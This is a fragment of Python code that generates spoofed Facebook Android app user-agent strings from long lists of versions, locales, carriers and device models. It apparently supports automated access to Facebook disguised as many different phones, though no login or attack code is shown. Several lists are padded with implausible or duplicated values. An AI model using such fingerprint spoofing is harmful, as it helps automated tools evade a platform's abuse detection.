	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"
	return ua
#----------------------------[DEF3]--------------------------------------------------------------------------------------------------------------------------------#
def DEF3():
    fban_fb4a = [f'FBAN/FB4A;FBAV/{301 + i}.0.0.0.{65 + i}' for i in range(49)]
    fbav = ['FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999))]
    fbbv = ['FBBV/' + str(random.randint(1111111, 9999999))]
    fbdm = list({f'FBDM/{{density=1.0,width={w},height={h}}}' for w, h in [(320, 480), (320, 568), (360, 640), (375, 667), (360, 720), (414, 736), (375, 812), (414, 896), (360, 780), (412, 846), (411, 731), (412, 847), (393, 786), (392, 820), (412, 869), (393, 851), (360, 683)]})
    fblc = ['FBLC/' + lang for lang in ['en_US', 'en_GB', 'es_ES', 'es_LA', 'fr_FR', 'de_DE', 'it_IT', 'nl_NL', 'pt_BR', 'pt_PT', 'ar_AR', 'bn_IN', 'zh_CN', 'zh_HK', 'zh_TW', 'hr_HR', 'cs_CZ', 'da_DK', 'fi_FI', 'fr_FR', 'de_DE', 'el_GR', 'iw_IL', 'hi_IN', 'hu_HU', 'in_ID', 'ja_JP', 'ko_KR', 'ms_MY', 'nb_NO', 'fa_IR', 'pl_PL', 'ro_RO', 'ru_RU', 'sr_RS', 'sk_SK', 'sl_SI', 'es_CL', 'sv_SE', 'tl_PH', 'th_TH', 'tr_TR', 'uk_UA', 'vi_VN', 'cy_GB', 'ur_PK', 'fy_NL', 'ne_NP', 'sq_AL', 'am_ET', 'hy_AM', 'az_AZ', 'eu_ES', 'be_BY', 'bs_BA', 'ka_GE', 'is_IS', 'jv_ID', 'kn_IN', 'kk_KZ', 'km_KH', 'lo_LA', 'la_VA', 'lv_LV', 'lt_LT', 'mk_MK', 'mg_MG', 'ms_BN', 'mt_MT', 'mr_IN', 'mn_MN', 'my_MM', 'nl_BE', 'no_NO', 'or_IN', 'ps_AF', 'fa_AF', 'pa_IN', 'qu_PE', 'ro_MD', 'rw_RW', 'sm_WS', 'st_ZA', 'sn_ZW', 'so_SO', 'sq_MK', 'sr_ME', 'su_ID', 'sw_KE', 'tg_TJ', 'ta_IN', 'tt_RU', 'te_IN', 'th_KH', 'ti_ET', 'to_TO', 'ts_ZA', 'tn_BW', 'tr_CY', 'tk_TM', 'uz_UZ', 've_ZA', 'vo_001', 'wa_BE', 'wo_SN', 'xh_ZA', 'yi_US', 'yo_NG', 'zu_ZA']]
    fbrv = [f'FBRV/{num}' for num in ['541211947', '0', '537275962', '478477801', '475722615', '30034644', '479317306', '478970936', '478880211', '478478064', '478249893', '478037428', '477481714', '477125993', '476729007', '476465495', '476253783', '475744275', '475337385', '474931337', '474441042', '473917206', '473216533', '472359048', '471660229', '470651795', '469522557', '468531229', '467507693', '466724884', '465653504', '464476908', '463448586', '462393688', '461247332', '460085039', '458998020', '458028990', '456759719', '455597378', '454650357', '453687517', '452531181', '451275304', '450172551', '448983014', '447787030', '446453875', '444891874', '443722429', '442395281', '440700434', '438152587', '435465179', '432878540', '429953098', '426467586', '422958444', '420325899', '417597586', '414273080', '410852912', '407639217', '404425199', '401334144', '398187692', '395097061', '392031060', '389015326', '385772744', '382508485', '379209121', '375911389', '372587842', '369277756', '365938936', '362630531', '359289291', '355969540', '352579744', '349298014', '345964358', '342553169', '339190213', '335852353', '332440744', '329140261', '325843309', '322505412', '319171616', '315872340', '312514289', '309220097', '305913356', '302625731', '299290432', '295952127', '292620569', '289287935', '285950460', '282602451', '279317302', '275970156', '272630402', '269296165', '265978679', '262625013', '259281689', '255942133', '252602470', '249300742', '245966906', '242651116', '239291759', '235963618', '232609215', '229298064', '225977275', '222610496', '219292266', '215979260', '212653107', '209291682', '205988690', '202672005', '199343264', '195989604', '192675462', '189343227', '185989722', '182674360', '179329186', '175993336', '172634134', '169307012', '165982720', '162644551', '159324610', '155985430', '152643544', '149308748', '145985537', '142640018', '139328299', '135988582', '132637181', '129325659', '125992176', '122638086', '119325324']]
    fbcr = [f'FBCR/{c}' for c in ['Verizon Wireless', 'AT&T', 'Sprint', 'T-Mobile', 'Metro by T-Mobile', 'US Cellular', 'Boost Mobile', 'Cricket Wireless', 'TracFone Wireless', 'Xfinity Mobile', 'Consumer Cellular', 'C Spire Wireless', 'Google Fi', 'Republic Wireless', 'Spectrum Mobile', 'Visible', 'Net10 Wireless', 'Simple Mobile', 'Page Plus Cellular', 'H2O Wireless', 'Red Pocket Mobile', 'Total Wireless', 'Reach Mobile', 'Gen Mobile', 'Twigby', 'Tello', 'Mint Mobile']]
    fbmf = [f'FBMF/{c}' for c in ['HMD Global', 'TECNO', 'Samsung', 'OnePlus', 'Google', 'Xiaomi', 'Apple', 'HTC', 'LG', 'Sony', 'Motorola', 'Huawei', 'OPPO', 'Vivo', 'Realme', 'Nokia', 'Asus', 'Lenovo', 'ZTE', 'Alcatel', 'Amazon', 'Razer', 'Essential', 'BlackBerry', 'Microsoft', 'Meizu', 'Palm', 'Nextbit', 'LeEco', 'Sharp', 'TCL', 'Google Pixel', 'Google Nexus', 'Google Pixelbook', 'Google Pixel Slate', 'Google Home', 'Google Chromecast', 'Google Nest', 'Google Stadia', 'Google Wifi', 'Google Daydream', 'Google Glass', 'Google Cardboard', 'Google Clips', 'Google Jamboard', 'Google OnHub', 'Google Pixel Buds', 'Google Pixel Stand', 'Google Titan Security Key', 'Google Titan Security Key Mini', 'Google USB Type-C Earbuds', 'Google USB-C to 3.5mm Headphone Adapter', 'Google Nest Hub', 'Google Nest Hub Max', 'Google Nest Mini', 'Google Nest Wifi', 'Google Pixel 4', 'Google Pixel 4 XL', 'Google Pixel 3', 'Google Pixel 3 XL', 'Google Pixel 3a', 'Google Pixel 3a XL', 'Google Pixel 2', 'Google Pixel 2 XL', 'Google Pixel', 'Google Pixel XL', 'Google Pixel C', 'Google Home Mini', 'Google Home Max', 'Google Nest Hub Max', 'Google Nest Hub', 'Google Chromecast', 'Google Chromecast Ultra', 'Google Chromecast Audio', 'Google Wifi', 'Google Nest Wifi', 'Google Daydream View', 'Google Daydream View (2017)', 'Google Cardboard', 'Google Cardboard (2015)', 'Google Clips', 'Google Jamboard', 'Google Pixel Buds', 'Google Pixel Buds (2017)', 'Google Pixel Buds (2020)', 'Google Pixel Stand', 'Google Titan Security Key', 'Google Titan Security Key Mini', 'Google USB Type-C Earbuds', 'Google USB-C to 3.5mm Headphone Adapter', 'Google Assistant', 'Google Assistant (2016)', 'Google Assistant (2017)', 'Google Assistant (2018)', 'Google Assistant (2019)', 'Google Assistant (2020)', 'Google Assistant (2021)', 'Google Assistant (2022)', 'Google Assistant (2023)', 'Google Assistant (2024)', 'Google Assistant (2025)', 'Google Assistant (2026)', 'Google Assistant (2027)', 'Google Assistant (2028)', 'Google Assistant (2029)', 'Google Assistant (2030)', 'Google Assistant (2031)', 'Google Assistant (2032)', 'Google Assistant (2033)', 'Google Assistant (2034)', 'Google Assistant (2035)', 'Google Assistant (2036)', 'Google Assistant (2037)', 'Google Assistant (2038)', 'Google Assistant (2039)', 'Google Assistant (2040)', 'Google Assistant (2041)', 'Google Assistant (2042)', 'Google Assistant (2043)', 'Google Assistant (2044)', 'Google Assistant (2045)', 'Google Assistant (2046)', 'Google Assistant (2047)', 'Google Assistant (2048)', 'Google Assistant (2049)', 'Google Assistant (2050)', 'Google Assistant (2051)', 'Google Assistant (2052)', 'Google Assistant (2053)', 'Google Assistant (2054)', 'Google Assistant (2055)', 'Google Assistant (2056)', 'Google Assistant (2057)', 'Google Assistant (2058)', 'Google Assistant (2059)', 'Google Assistant (2060)', 'Google Assistant (2061)', 'Google Assistant (2062)', 'Google Assistant (2063)', 'Google Assistant (2064)', 'Google Assistant (2065)', 'Google Assistant (2066)', 'Google Assistant (2067)', 'Google Assistant (2068)', 'Google Assistant (2069)', 'Google Assistant (2070)', 'Google Assistant (2071)', 'Google Assistant (2072)', 'Google Assistant (2073)', 'Google Assistant (2074)', 'Google Assistant (2075)', 'Google Assistant (2076)']]
    fbbd = [f'FBBD/{c}' for c in ['Samsung', 'Apple', 'Google', 'Xiaomi', 'OnePlus', 'Huawei', 'OPPO', 'Vivo', 'Realme', 'Nokia', 'Sony', 'LG', 'Motorola', 'HTC', 'ASUS', 'Lenovo', 'ZTE', 'Alcatel', 'Amazon', 'Razer', 'Essential', 'BlackBerry', 'Microsoft', 'Meizu', 'Palm', 'Nextbit', 'LeEco', 'Sharp', 'TCL', 'Google Pixel', 'Google Nexus', 'Google Pixelbook', 'Google Pixel Slate', 'Google Home', 'Google Chromecast', 'Google Nest', 'Google Stadia', 'Google Wifi', 'Google Daydream', 'Google Glass', 'Google Cardboard', 'Google Clips', 'Google Jamboard', 'Google OnHub', 'Google Pixel Buds', 'Google Pixel Stand', 'Google Titan Security Key', 'Google Titan Security Key Mini', 'Google USB Type-C Earbuds', 'Google USB-C to 3.5mm Headphone Adapter', 'Google Nest Hub', 'Google Nest Hub Max', 'Google Nest Mini', 'Google Nest Wifi', 'Google Pixel 4', 'Google Pixel 4 XL', 'Google Pixel 3', 'Google Pixel 3 XL', 'Google Pixel 3a', 'Google Pixel 3a XL', 'Google Pixel 2', 'Google Pixel 2 XL', 'Google Pixel', 'Google Pixel XL', 'Google Pixel C', 'Google Home Mini', 'Google Home Max', 'Google Nest Hub Max', 'Google Nest Hub', 'Google Chromecast', 'Google Chromecast Ultra', 'Google Chromecast Audio', 'Google Wifi', 'Google Nest Wifi', 'Google Daydream View', 'Google Daydream View (2017)', 'Google Cardboard', 'Google Cardboard (2015)', 'Google Clips', 'Google Jamboard', 'Google Pixel Buds', 'Google Pixel Buds (2017)', 'Google Pixel Buds (2020)', 'Google Pixel Stand', 'Google Titan Security Key', 'Google Titan Security Key Mini', 'Google USB Type-C Earbuds', 'Google USB-C to 3.5mm Headphone Adapter', 'Google Assistant', 'Google Assistant (2016)', 'Google Assistant (2017)', 'Google Assistant (2018)', 'Google Assistant (2019)', 'Google Assistant (2020)', 'Google Assistant (2021)', 'Google Assistant (2022)', 'Google Assistant (2023)', 'Google Assistant (2024)', 'Google Assistant (2025)', 'Google Assistant (2026)', 'Google Assistant (2027)', 'Google Assistant (2028)', 'Google Assistant (2029)', 'Google Assistant (2030)', 'Google Assistant (2031)', 'Google Assistant (2032)', 'Google Assistant (2033)', 'Google Assistant (2034)', 'Google Assistant (2035)', 'Google Assistant (2036)', 'Google Assistant (2037)', 'Google Assistant (2038)', 'Google Assistant (2039)', 'Google Assistant (2040)']]
    fbpn = ['com.facebook.katana', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.mlite', 'com.facebook.wakizashi', 'com.facebook.alohawrapper', 'com.facebook.arstudio.player', 'com.facebook.gaming', 'com.facebook.work', 'com.facebook.threads', 'com.facebook.pages.app', 'com.facebook.shop', 'com.facebook.bonfire', 'com.facebook.gameroom', 'com.facebook.creatorstudio', 'com.facebook.intern', 'com.facebook.feed', 'com.facebook.oz', 'com.facebook.kaios', 'com.facebook.atlas', 'com.facebook.hyperloop', 'com.facebook.katana.dev', 'com.facebook.system', 'com.facebook.system.dev', 'com.facebook.services', 'com.facebook.services.dev', 'com.facebook.appmanager', 'com.facebook.appmanager.dev', 'com.facebook.katana.orca', 'com.facebook.loom', 'com.facebook.lite.dev', 'com.facebook.orca.dev', 'com.facebook.mlite.dev', 'com.facebook.wakizashi.dev', 'com.facebook.alohawrapper.dev', 'com.facebook.arstudio.player.dev', 'com.facebook.gaming.dev', 'com.facebook.work.dev', 'com.facebook.threads.dev', 'com.facebook.pages.app.dev', 'com.facebook.shop.dev', 'com.facebook.bonfire.dev', 'com.facebook.gameroom.dev', 'com.facebook.creatorstudio.dev', 'com.facebook.intern.dev', 'com.facebook.feed.dev', 'com.facebook.oz.dev', 'com.facebook.kaios.dev', 'com.facebook.atlas.dev', 'com.facebook.hyperloop.dev', 'com.facebook.system.dev', 'com.facebook.services.dev', 'com.facebook.appmanager.dev', 'com.facebook.katana.orca.dev', 'com.facebook.loom.dev']
    fbdv = ['FBDV/iPhone12,1', 'FBDV/iPhone11,8', 'FBDV/iPhone10,6', 'FBDV/iPhone9,4', 'FBDV/iPhone8,1', 'FBDV/iPhone7,2', 'FBDV/iPhone6,2', 'FBDV/Samsung SM-G998U', 'FBDV/Samsung SM-G991U', 'FBDV/Samsung SM-G9980', 'FBDV/Samsung SM-G9910', 'FBDV/Samsung SM-N986B', 'FBDV/Samsung SM-N981B', 'FBDV/Google Pixel 5', 'FBDV/Google Pixel 4a', 'FBDV/Google Pixel 3 XL', 'FBDV/Google Pixel 2', 'FBDV/OnePlus IN2015', 'FBDV/OnePlus IN2025', 'FBDV/OnePlus KB2005', 'FBDV/OnePlus KB2001', 'FBDV/Xiaomi Redmi Note 10', 'FBDV/Xiaomi Redmi Note 9', 'FBDV/Xiaomi Mi 11', 'FBDV/Xiaomi Mi 10T', 'FBDV/Huawei ELS-NX9', 'FBDV/Huawei ELS-N04', 'FBDV/Huawei EVR-N29', 'FBDV/Huawei EVR-L29', 'FBDV/LG LM-V450', 'FBDV/LG LM-Q910', 'FBDV/LG LM-G820', 'FBDV/LG LM-Q730', 'FBDV/Sony Xperia 1 III', 'FBDV/Sony Xperia 5 III', 'FBDV/Sony Xperia 10 III', 'FBDV/Sony Xperia 1 II', 'FBDV/Motorola XT2125-4', 'FBDV/Motorola XT2113-3', 'FBDV/Motorola XT2125-3', 'FBDV/Motorola XT2115-1', 'FBDV/Nokia TA-1321', 'FBDV/Nokia TA-1335', 'FBDV/Nokia TA-1337', 'FBDV/Nokia TA-1322', 'FBDV/Asus_I003D', 'FBDV/Asus_I003DD', 'FBDV/Asus_I003DA', 'FBDV/Asus_I003DB', 'FBDV/Lenovo TB-X606F', 'FBDV/Lenovo TB-X606X', 'FBDV/Lenovo TB-X606V', 'FBDV/Lenovo TB-X606', 'FBDV/ZTE N928Dt', 'FBDV/ZTE A2021', 'FBDV/ZTE N928D', 'FBDV/ZTE A2020G', 'FBDV/Alcatel 5033D', 'FBDV/Alcatel 5033Y', 'FBDV/Alcatel 5033A', 'FBDV/Alcatel 5033X', 'FBDV/Amazon KDFOWI', 'FBDV/Amazon KFSUWI', 'FBDV/Amazon KFSAWI', 'FBDV/Amazon KFDOWI', 'FBDV/Razer Phone', 'FBDV/Razer Phone 2', 'FBDV/Razer Phone 3', 'FBDV/Essential Products PH-1', 'FBDV/Essential Products PH-2', 'FBDV/BlackBerry BBE100-2', 'FBDV/BlackBerry BBE100-5', 'FBDV/BlackBerry BBE100-4', 'FBDV/BlackBerry BBE100-1', 'FBDV/Microsoft RM-1091', 'FBDV/Microsoft RM-1109', 'FBDV/Microsoft RM-1077', 'FBDV/Microsoft RM-1089', 'FBDV/Meizu M882Q', 'FBDV/Meizu M882H', 'FBDV/Meizu M882A', 'FBDV/Meizu M882J', 'FBDV/Palm PVG100', 'FBDV/Palm PVG100E', 'FBDV/Palm PVG100EU', 'FBDV/Palm PVG100EAWW', 'FBDV/Nextbit Robin', 'FBDV/Nextbit Robin 2', 'FBDV/Nextbit Robin 3', 'FBDV/Nextbit Robin 4', 'FBDV/LeEco LEX622', 'FBDV/LeEco LEX720', 'FBDV/LeEco LEX727', 'FBDV/LeEco LEX725', 'FBDV/Sharp Z3', 'FBDV/Sharp Z2', 'FBDV/Sharp Z1', 'FBDV/Sharp Z4', 'FBDV/TCL 10 SE', 'FBDV/TCL 10 Plus', 'FBDV/TCL 10L', 'FBDV/TCL 10 Pro', 'FBDV/Google Pixel Slate', 'FBDV/Google Pixelbook', 'FBDV/Google Pixelbook Go', 'FBDV/Google Pixel C', 'FBDV/Google Nexus 10', 'FBDV/Google Nexus 9', 'FBDV/Google Nexus 7', 'FBDV/Google Nexus 6P', 'FBDV/Google Nexus 6', 'FBDV/Google Nexus 5X', 'FBDV/Google Nexus 5', 'FBDV/Google Nexus 4', 'FBDV/Google Glass', 'FBDV/Google Home', 'FBDV/Google Home Mini', 'FBDV/Google Home Max', 'FBDV/Google Nest Hub', 'FBDV/Google Nest Hub Max', 'FBDV/Google Nest Mini', 'FBDV/Google Nest Audio', 'FBDV/Google Chromecast', 'FBDV/Google Chromecast Ultra', 'FBDV/Google Chromecast Audio', 'FBDV/Google Pixel Buds']
    fbsv = [f'FBSV/{i}' for i in range(80)]
    fbop = [f'FBOP/{i}' for i in range(1, 201)]
    fbca = ['FBCA/arm64-v8a;FBMF/Samsung;FBBD/Galaxy S21 Ultra;FBSV/11;FBDM/{density=3.0,width=1440,height=3088};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/OnePlus;FBBD/OnePlus 9 Pro;FBSV/11;FBDM/{density=3.0,width=1440,height=3216};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Xiaomi;FBBD/Mi 11 Ultra;FBSV/11;FBDM/{density=3.0,width=1440,height=3200};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Apple;FBBD/iPhone 13 Pro Max;FBSV/15;FBDM/{density=3.0,width=1284,height=2778};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Google;FBBD/Pixel 6 Pro;FBSV/13;FBDM/{density=3.5,width=1440,height=3120};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/OPPO;FBBD/Find X5 Pro;FBSV/12;FBDM/{density=3.0,width=1440,height=3200};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Vivo;FBBD/iQOO 9 Pro;FBSV/12;FBDM/{density=3.0,width=1440,height=3216};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Realme;FBBD/Realme GT 2 Pro;FBSV/12;FBDM/{density=3.0,width=1440,height=3200};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Nokia;FBBD/Nokia G50;FBSV/12;FBDM/{density=2.0,width=720,height=1600};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Sony;FBBD/Xperia 1 III;FBSV/11;FBDM/{density=3.0,width=1644,height=3840};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Motorola;FBBD/Moto G Stylus 5G;FBSV/11;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Huawei;FBBD/Mate 40 Pro;FBSV/10;FBDM/{density=3.0,width=1344,height=2772};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/OPPO;FBBD/Reno6 Pro;FBSV/11;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Vivo;FBBD/X60 Pro+;FBSV/11;FBDM/{density=3.0,width=1080,height=2376};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Realme;FBBD/Realme 8 Pro;FBSV/11;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Nokia;FBBD/Nokia X20;FBSV/11;FBDM/{density=2.5,width=1080,height=2408};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Sony;FBBD/Xperia 10 III;FBSV/11;FBDM/{density=3.0,width=1080,height=2520};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Motorola;FBBD/Moto G Power (2021);FBSV/11;FBDM/{density=3.0,width=1080,height=2340};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Huawei;FBBD/P40 Pro;FBSV/10;FBDM/{density=3.0,width=1200,height=2640};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/OnePlus;FBBD/Nord N200 5G;FBSV/11;FBDM/{density=2.0,width=720,height=1600};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Samsung;FBBD/Galaxy A52 5G;FBSV/11;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBCA/arm64-v8a;FBMF/Xiaomi;FBBD/Redmi Note 10 Pro;FBSV/11;FBDM/{density=3.5,width=1080,height=2400};FBLC/en_US;FBRV/228792653;FBCR/T-Mobile', 'FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBAN/FB4A;FBAV/442.0.0.44.114;FBBV/541369658;FBAN/FB4A;FBAV/440.0.0.31.105;FBBV/534746244;FBAN/FB4A;FBAV/415.0.0.34.107;FBBV/475722615;FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;', 'FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBDM/{density=1.75,width=720,height=1515};FBLC/en_US;FBRV/541211947;', 'FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBAN/FB4A;FBAV/442.0.0.44.114;FBBV/541369658;FBDM/{density=1.75,width=720,height=1478};FBLC/en_US;FBRV/0;FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBDM/{density=1.75,width=720,height=1421};FBLC/en_US;FBRV/0;', 'FBAN/FB4A;FBAV/440.0.0.31.105;FBBV/534746244;FBDM/{density=2.5,width=1080,height=2224};FBLC/en_US;FBRV/537275962;FBAN/FB4A;FBAV/415.0.0.34.107;FBBV/475722615;FBDM/{density=2.7875001,width=1080,height=2165};FBLC/es_LA;FBRV/478477801;', 'FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBRV/537275962;FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBDM/{density=1.75,width=720,height=1515};FBLC/en_US;FBRV/541211947;', 'FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBAN/FB4A;FBAV/442.0.0.44.114;FBBV/541369658;FBAN/FB4A;FBAV/440.0.0.31.105;FBBV/534746244;FBAN/FB4A;FBAV/415.0.0.34.107;FBBV/475722615;FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;', 'FBAN/FB4A;FBAV/441.1.0.39.109;FBBV/539182857;FBDM/{density=1.75,width=720,height=1515};FBLC/en_US;FBRV/541211947;', 'FBAN/FB4A;FBAV/442.0.0.44.114;FBBV/541369658;FBDM/{density=1.75,width=720,height=1478};FBLC/en_US;FBRV/0;', 'FBAN/FB4A;FBAV/440.0.0.31.105;FBBV/534746244;FBDM/{density=2.5,width=1080,height=2224};FBLC/en_US;FBRV/537275962;', 'FBAN/FB4A;FBAV/415.0.0.34.107;FBBV/475722615;FBDM/{density=2.7875001,width=1080,height=2165};FBLC/es_LA;FBRV/478477801;', 'FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBRV/537275962;']
    SUBI = ';'.join(random.choice(part) for part in [fban_fb4a, fbav, fbbv, fban_fb4a, fbav, fbbv, fbdm, fblc, fbrv, fbcr, fbmf, fbbd, fbpn, fbdv, fbsv, fbop, fbca])
    return SUBI
#----------------------------[DEF4]--------------------------------------------------------------------------------------------------------------------------------#
def DEF4():
    uaz = "[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918989;FBDM/{density=1.7,width=720,height=1385};FBLC/id_ID;FBRV/344561895;FBCR/AXIS;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/RMX1805;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    uaz1 = "[FBAN/FB4A;FBAV/261.0.0.52.126;FBBV/202681565;FBDM/{density=2.0,width=720,height=1352};FBLC/it_IT;FBRV/203912779;FBCR/ho.;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00RD;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    uaz2 = "[FBAN/FB4A;FBAV/265.0.0.61.103;FBBV/208173642;FBDM/{density=2.625,width=1080,height=2047};FBLC/en_US;FBRV/209076735;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    uaz3 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=3.0,width=1080,height=2192};FBLC/en_US;FBRV/210347457;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z4;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    uaz4 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/210430229;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    uaz5 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=2.625,width=1080,height=2064};FBLC/en_US;FBRV/210658448;FBCR/Spectrum;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N970U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    uaz6 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629374;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/210796532;FBCR/Republic;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U1;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    uaz7 = "[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681957;FBDM/{density=3.5,width=1440,height=2759};FBLC/en_US;FBRV/212345419;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N976V;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    uaz8 = "[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681925;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBRV/212646349;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1710-02;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    uaz9 = "[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027763;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/209644275;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    uaz10 = "[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/385537828;FBDM/{density=2.0,width=720,height=1384};FBLC/ru_RU;FBRV/386809220;FBCR/LMT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600FN;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    uaz11 = "[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636710;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/0;FBCR/Idea - Be Safe;FBMF/GIONEE;FBBD/GIONEE;FBPN/com.facebook.katana;FBDV/GIONEE F205 Pro;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    uaz12 = "[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845465;FBDM/{density=2.0,width=1536,height=2048};FBLC/en_US;FBRV/218114099;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T713;FBSV/7.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    uaz13 = "[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237439;FBDM/{density=1.7,width=720,height=1469};FBLC/hi_IN;FBRV/0;FBCR/Jio 4G;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1911;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    uaz14 = "[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=2.75,width=1080,height=2030};FBLC/uk_UA;FBRV/227809097;FBCR/Vodafone UA;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    uaz15 = "[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783074;FBDM/{density=2.625,width=1080,height=2047};FBLC/en_US;FBRV/214205475;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
